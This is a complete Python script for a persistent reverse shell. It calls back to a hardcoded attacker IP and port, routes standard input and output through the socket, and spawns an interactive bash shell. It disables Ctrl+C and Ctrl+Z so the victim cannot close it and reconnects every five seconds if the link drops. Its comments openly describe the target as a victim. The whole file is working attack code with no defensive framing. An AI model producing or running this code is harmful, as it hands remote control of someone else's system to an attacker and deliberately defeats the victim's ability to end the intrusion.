import socket
import os
import pty
import time
import signal

# Attacker's IP & Port (CHANGE THESE)
ATTACKER_IP = "172.17.0.3"
ATTACKER_PORT = 2222

def block_signals():
    """Disable Ctrl+C and Ctrl+Z to prevent the victim from closing the shell."""
    signal.signal(signal.SIGINT, signal.SIG_IGN)   # Ignore Ctrl+C
    signal.signal(signal.SIGTSTP, signal.SIG_IGN)  # Ignore Ctrl+Z

def reverse_shell():
    """Creates a persistent, fully interactive reverse shell that the victim can't close."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))

            # Disable Ctrl+C and Ctrl+Z (Victim can't exit)
            block_signals()

            # Duplicate socket to stdin, stdout, stderr
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            # Spawn a fully interactive shell
            pty.spawn("/bin/bash")

        except Exception:
            time.sleep(5)  # Retry after 5 seconds
        finally:
            s.close()

if __name__ == "__main__":
    reverse_shell()
